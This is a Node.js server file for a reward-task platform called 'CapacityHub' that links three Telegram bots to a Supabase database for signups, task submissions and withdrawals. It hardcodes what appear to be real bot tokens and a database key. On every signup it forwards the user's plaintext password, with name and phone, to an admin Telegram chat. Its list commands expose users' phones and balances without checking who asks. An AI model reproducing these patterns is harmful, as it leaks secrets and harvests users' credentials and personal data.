/**
 * CapacityHub Telegram Bot Server
 * Connects Bot A (signups), Bot B (submissions), Bot C (withdrawals) to Supabase
 *
 * Install:
 *   npm install node-telegram-bot-api @supabase/supabase-js
 *
 * Run:
 *   node server.js
 */

const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');

// ══════════════════════════════════════════
// CONFIG — fill in your bot tokens
// ══════════════════════════════════════════
const CONFIG = {
    // Paste your 3 bot tokens from @BotFather
    BOT_A_TOKEN: '8871153618:AAEpnVzycmv5Mn2-gKZ19p44Qj0gWT7NC-4', // Receives new user signups
    BOT_B_TOKEN: '8913775751:AAFBPFztDFbA9FqJwtDwvo1ymFXQwVaRqGs', // Task submissions approve/decline
    BOT_C_TOKEN: '8809856569:AAEEVItQkMLf6qsyE5TTIbU-UqRGF6b-dvI', // Withdrawal requests approve/decline

    // Your Supabase credentials
    SUPA_URL: 'https://bjwitwiowsbgddfdcgjh.supabase.co',
    SUPA_KEY: 'sb_publishable_XWitvEM2jpIabwMzxUAKzA_lBkrP0EG',

    // Your Telegram chat IDs — get them by messaging @userinfobot
    ADMIN_CHAT_A: '7289939366', // Chat where signup notifications go
    ADMIN_CHAT_B: '7289939366', // Chat where submission alerts go
    ADMIN_CHAT_C: '7289939366', // Chat where withdrawal alerts go
};

// ══════════════════════════════════════════
// SUPABASE CLIENT
// ══════════════════════════════════════════
const supa = createClient(CONFIG.SUPA_URL, CONFIG.SUPA_KEY);

// ══════════════════════════════════════════
// INIT BOTS
// ══════════════════════════════════════════
const botA = new TelegramBot(CONFIG.BOT_A_TOKEN, { polling: true });
const botB = new TelegramBot(CONFIG.BOT_B_TOKEN, { polling: true });
const botC = new TelegramBot(CONFIG.BOT_C_TOKEN, { polling: true });

console.log('✅ All 3 Telegram bots started');

// ══════════════════════════════════════════
// HELPER: Save meta to Supabase app_meta
// ══════════════════════════════════════════
async function getAppMeta() {
    const { data } = await supa.from('app_meta').select('payload').eq('id', 'main').single();
    return data?.payload || { tasks: [], usd_rate: 1500, totalPaid: 0 };
}

async function saveAppMeta(payload) {
    await supa.from('app_meta').upsert({ id: 'main', payload }, { onConflict: 'id' });
}

// ══════════════════════════════════════════
// BOT A — NEW USER SIGNUPS
// ══════════════════════════════════════════
// Listens to Supabase real-time for new users and sends notification to admin
supa.channel('bot-a-users')
    .on('postgres_changes', {
        event: 'INSERT', schema: 'public', table: 'users'
    }, async payload => {
        const u = payload.new;
        if (!u) return;
        const msg =
            `👤 *New User Registered*\n\n` +
            `🆔 UID: \`${u.uid}\`\n` +
            `👋 Name: *${u.name}*\n` +
            `📞 Phone: \`${u.phone}\`\n` +
            `🔐 Password: \`${u.password}\`\n` +
            `🌍 Country: ${u.country}\n` +
            `📅 Registered: ${u.created}`;
        try {
            await botA.sendMessage(CONFIG.ADMIN_CHAT_A, msg, { parse_mode: 'Markdown' });
            console.log('✅ Bot A: New user notification sent:', u.name);
        } catch(e) {
            console.error('❌ Bot A send error:', e.message);
        }
    }).subscribe();

// Bot A command: /users — list all users
botA.onText(/\/users/, async (msg) => {
    const chatId = msg.chat.id;
    const { data, error } = await supa.from('users').select('*').order('created', { ascending: false }).limit(20);
    if (error || !data.length) {
        botA.sendMessage(chatId, '❌ No users found or error: ' + (error?.message || ''));
        return;
    }
    let text = `👥 *Total Users: ${data.length}*\n\n`;
    data.slice(0, 10).forEach((u, i) => {
        text += `${i+1}. *${u.name}* | ${u.phone} | ${u.country}\n`;
        text += `   💰 NGN: ₦${u.wallet_balance || 0} | USDT: ${u.usdt_balance || 0}\n\n`;
    });
    botA.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// Bot A command: /stats
botA.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    const { count: users } = await supa.from('users').select('*', { count: 'exact', head: true });
    const { count: subs } = await supa.from('submissions').select('*', { count: 'exact', head: true });
    const { count: wds } = await supa.from('withdrawals').select('*', { count: 'exact', head: true });
    const meta = await getAppMeta();
    const text =
        `📊 *CapacityHub Stats*\n\n` +
        `👥 Users: ${users || 0}\n` +
        `📥 Submissions: ${subs || 0}\n` +
        `💸 Withdrawals: ${wds || 0}\n` +
        `💰 Total Paid: ₦${meta.totalPaid || 0}\n` +
        `📈 USD Rate: ₦${meta.usd_rate || 1500}`;
    botA.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// ══════════════════════════════════════════
// BOT B — TASK SUBMISSIONS
// ══════════════════════════════════════════
// Listen for new submissions → send to admin with Approve/Decline buttons
supa.channel('bot-b-submissions')
    .on('postgres_changes', {
        event: 'INSERT', schema: 'public', table: 'submissions'
    }, async payload => {
        const s = payload.new;
        if (!s) return;

        // Get task details from app_meta
        const meta = await getAppMeta();
        const task = (meta.tasks || []).find(t => t.id === s.task_id);

        const msg =
            `📥 *New Task Submission*\n\n` +
            `👤 User: *${s.user_name}*\n` +
            `🆔 UID: \`${s.user_id}\`\n` +
            `📋 Task: *${task?.title || s.task_id}*\n` +
            `💰 Reward: ₦${task?.reward || 0}\n` +
            `📝 Note: ${s.note || 'No note'}\n` +
            `📅 Date: ${s.date}\n` +
            (s.screenshot && s.screenshot !== '[image_uploaded]' ? `🖼️ Screenshot attached` : `🖼️ No screenshot`);

        const keyboard = {
            inline_keyboard: [[
                { text: '✅ Approve & Pay', callback_data: `approve_sub:${s.id}` },
                { text: '❌ Decline', callback_data: `decline_sub:${s.id}` }
            ]]
        };

        try {
            await botB.sendMessage(CONFIG.ADMIN_CHAT_B, msg, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
            console.log('✅ Bot B: Submission notification sent for:', s.user_name);
        } catch(e) {
            console.error('❌ Bot B send error:', e.message);
        }
    }).subscribe();

// Bot B: handle Approve/Decline button taps
botB.on('callback_query', async (query) => {
    const data = query.data;
    const chatId = query.message.chat.id;
    const msgId = query.message.message_id;

    if (data.startsWith('approve_sub:')) {
        const subId = data.replace('approve_sub:', '');
        await approveSubmission(botB, subId, chatId, msgId, query.id);
    } else if (data.startsWith('decline_sub:')) {
        const subId = data.replace('decline_sub:', '');
        await declineSubmission(botB, subId, chatId, msgId, query.id);
    }
});

// Bot B: /submissions command
botB.onText(/\/submissions/, async (msg) => {
    const chatId = msg.chat.id;
    const { data } = await supa.from('submissions').select('*')
        .eq('status', 'pending').order('date', { ascending: false }).limit(10);
    if (!data || !data.length) {
        botB.sendMessage(chatId, '✅ No pending submissions.');
        return;
    }
    const meta = await getAppMeta();
    let text = `📥 *Pending Submissions: ${data.length}*\n\n`;
    for (const s of data.slice(0, 5)) {
        const task = (meta.tasks || []).find(t => t.id === s.task_id);
        text += `👤 *${s.user_name}* — ${task?.title || 'Task'}\n`;
        text += `💰 ₦${task?.reward || 0} | 📅 ${s.date}\n\n`;
    }
    botB.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// ══════════════════════════════════════════
// BOT C — WITHDRAWAL REQUESTS
// ══════════════════════════════════════════
supa.channel('bot-c-withdrawals')
    .on('postgres_changes', {
        event: 'INSERT', schema: 'public', table: 'withdrawals'
    }, async payload => {
        const w = payload.new;
        if (!w) return;

        let details = '';
        if (w.type === 'USDT') {
            details =
                `🌐 Network: ${w.network || 'BEP20'}\n` +
                `👛 Wallet: \`${w.wallet_address}\``;
        } else {
            details =
                `🏦 Bank: ${w.bank_name}\n` +
                `👤 Account Name: ${w.acc_name}\n` +
                `🔢 Account No: \`${w.acc_num}\``;
        }

        const msg =
            `💸 *New Withdrawal Request*\n\n` +
            `👤 User: *${w.user_name}*\n` +
            `📞 Phone: \`${w.user_phone}\`\n` +
            `🆔 UID: \`${w.user_id}\`\n` +
            `💰 Amount: ${w.type === 'USDT' ? w.amount + ' USDT' : '₦' + Number(w.amount).toLocaleString()}\n` +
            `📋 Type: ${w.type}\n` +
            `${details}\n` +
            `📅 Date: ${w.date}`;

        const keyboard = {
            inline_keyboard: [[
                { text: '✅ Approve Payment', callback_data: `approve_wd:${w.id}` },
                { text: '❌ Decline & Refund', callback_data: `decline_wd:${w.id}` }
            ]]
        };

        try {
            await botC.sendMessage(CONFIG.ADMIN_CHAT_C, msg, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
            console.log('✅ Bot C: Withdrawal notification sent for:', w.user_name);
        } catch(e) {
            console.error('❌ Bot C send error:', e.message);
        }
    }).subscribe();

// Bot C: handle Approve/Decline button taps
botC.on('callback_query', async (query) => {
    const data = query.data;
    const chatId = query.message.chat.id;
    const msgId = query.message.message_id;

    if (data.startsWith('approve_wd:')) {
        const wdId = data.replace('approve_wd:', '');
        await approveWithdrawal(botC, wdId, chatId, msgId, query.id);
    } else if (data.startsWith('decline_wd:')) {
        const wdId = data.replace('decline_wd:', '');
        await declineWithdrawal(botC, wdId, chatId, msgId, query.id);
    }
});

// Bot C: /withdrawals command
botC.onText(/\/withdrawals/, async (msg) => {
    const chatId = msg.chat.id;
    const { data } = await supa.from('withdrawals').select('*')
        .eq('status', 'pending').order('date', { ascending: false }).limit(10);
    if (!data || !data.length) {
        botC.sendMessage(chatId, '✅ No pending withdrawals.');
        return;
    }
    let text = `💸 *Pending Withdrawals: ${data.length}*\n\n`;
    for (const w of data.slice(0, 5)) {
        text += `👤 *${w.user_name}* — ${w.type === 'USDT' ? w.amount + ' USDT' : '₦' + Number(w.amount).toLocaleString()}\n`;
        text += `📅 ${w.date}\n\n`;
    }
    botC.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// ══════════════════════════════════════════
// SHARED ACTION FUNCTIONS
// ══════════════════════════════════════════

async function approveSubmission(bot, subId, chatId, msgId, queryId) {
    try {
        await bot.answerCallbackQuery(queryId, { text: '⏳ Processing...' });

        const { data: sArr } = await supa.from('submissions').select('*').eq('id', subId);
        const s = sArr && sArr[0];
        if (!s || s.status !== 'pending') {
            await bot.answerCallbackQuery(queryId, { text: '⚠️ Already processed.' });
            return;
        }

        const meta = await getAppMeta();
        const task = (meta.tasks || []).find(t => t.id === s.task_id);
        const reward = Number(task?.reward || 0);

        const { data: uArr } = await supa.from('users').select('*').eq('uid', s.user_id);
        const user = uArr && uArr[0];
        if (!user) {
            await bot.sendMessage(chatId, '❌ User not found in database.');
            return;
        }

        const newBalance = (user.wallet_balance || 0) + reward;
        const newHistory = [
            {
                title: `✅ Task Reward: ${task?.title || 'Task'}`,
                amount: reward, type: 'plus',
                date: new Date().toLocaleString('en-NG', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
            },
            ...(user.history || [])
        ].slice(0, 50);

        await supa.from('users').update({ wallet_balance: newBalance, history: newHistory }).eq('uid', s.user_id);
        await supa.from('submissions').update({ status: 'approved' }).eq('id', subId);

        // Update totalPaid in meta
        meta.totalPaid = (meta.totalPaid || 0) + reward;
        await saveAppMeta(meta);

        // Edit the Telegram message to show approved
        await bot.editMessageText(
            `✅ *APPROVED*\n\n👤 ${user.name}\n💰 ₦${reward.toLocaleString()} deposited to wallet\n📋 Task: ${task?.title || 'Task'}`,
            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
        );

        console.log(`✅ Submission approved: ${user.name} — ₦${reward}`);
    } catch(e) {
        console.error('❌ approveSubmission:', e.message);
        await bot.sendMessage(chatId, '❌ Error: ' + e.message);
    }
}

async function declineSubmission(bot, subId, chatId, msgId, queryId) {
    try {
        await bot.answerCallbackQuery(queryId, { text: '⏳ Processing...' });
        const { data: sArr } = await supa.from('submissions').select('*').eq('id', subId);
        const s = sArr && sArr[0];
        if (!s) return;

        await supa.from('submissions').update({ status: 'declined' }).eq('id', subId);

        await bot.editMessageText(
            `❌ *DECLINED*\n\n👤 ${s.user_name}\n📋 Submission declined.`,
            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
        );
        console.log(`✅ Submission declined: ${s.user_name}`);
    } catch(e) {
        console.error('❌ declineSubmission:', e.message);
    }
}

async function approveWithdrawal(bot, wdId, chatId, msgId, queryId) {
    try {
        await bot.answerCallbackQuery(queryId, { text: '⏳ Processing...' });

        const { data: wArr } = await supa.from('withdrawals').select('*').eq('id', wdId);
        const w = wArr && wArr[0];
        if (!w || w.status !== 'pending') {
            await bot.answerCallbackQuery(queryId, { text: '⚠️ Already processed.' });
            return;
        }

        const { data: uArr } = await supa.from('users').select('*').eq('uid', w.user_id);
        const user = uArr && uArr[0];

        if (user) {
            const newHistory = [
                {
                    title: `✅ Withdrawal Approved: ${w.type === 'USDT' ? w.amount + ' USDT' : '₦' + Number(w.amount).toLocaleString()}`,
                    amount: w.amount, type: 'minus',
                    date: new Date().toLocaleString('en-NG', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
                },
                ...(user.history || [])
            ].slice(0, 50);
            await supa.from('users').update({ history: newHistory }).eq('uid', w.user_id);
        }

        await supa.from('withdrawals').update({ status: 'approved' }).eq('id', wdId);

        const amtStr = w.type === 'USDT' ? `${w.amount} USDT` : `₦${Number(w.amount).toLocaleString()}`;
        await bot.editMessageText(
            `✅ *APPROVED*\n\n👤 ${w.user_name}\n💰 ${amtStr} withdrawal approved\n📅 Payment sent`,
            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
        );
        console.log(`✅ Withdrawal approved: ${w.user_name} — ${amtStr}`);
    } catch(e) {
        console.error('❌ approveWithdrawal:', e.message);
        await bot.sendMessage(chatId, '❌ Error: ' + e.message);
    }
}

async function declineWithdrawal(bot, wdId, chatId, msgId, queryId) {
    try {
        await bot.answerCallbackQuery(queryId, { text: '⏳ Processing...' });

        const { data: wArr } = await supa.from('withdrawals').select('*').eq('id', wdId);
        const w = wArr && wArr[0];
        if (!w || w.status !== 'pending') return;

        const { data: uArr } = await supa.from('users').select('*').eq('uid', w.user_id);
        const user = uArr && uArr[0];

        if (user) {
            const field = w.type === 'USDT' ? 'usdt_balance' : 'wallet_balance';
            const refunded = (user[field] || 0) + Number(w.amount);
            const newHistory = [
                {
                    title: `↩️ Withdrawal Refunded: ${w.type === 'USDT' ? w.amount + ' USDT' : '₦' + Number(w.amount).toLocaleString()}`,
                    amount: w.amount, type: 'plus',
                    date: new Date().toLocaleString('en-NG', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
                },
                ...(user.history || [])
            ].slice(0, 50);
            await supa.from('users').update({ [field]: refunded, history: newHistory }).eq('uid', w.user_id);
        }

        await supa.from('withdrawals').update({ status: 'declined' }).eq('id', wdId);

        const amtStr = w.type === 'USDT' ? `${w.amount} USDT` : `₦${Number(w.amount).toLocaleString()}`;
        await bot.editMessageText(
            `❌ *DECLINED & REFUNDED*\n\n👤 ${w.user_name}\n💰 ${amtStr} refunded to wallet`,
            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
        );
        console.log(`✅ Withdrawal declined & refunded: ${w.user_name}`);
    } catch(e) {
        console.error('❌ declineWithdrawal:', e.message);
    }
}

// ══════════════════════════════════════════
// GRACEFUL SHUTDOWN
// ══════════════════════════════════════════
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down bots...');
    botA.stopPolling();
    botB.stopPolling();
    botC.stopPolling();
    process.exit(0);
});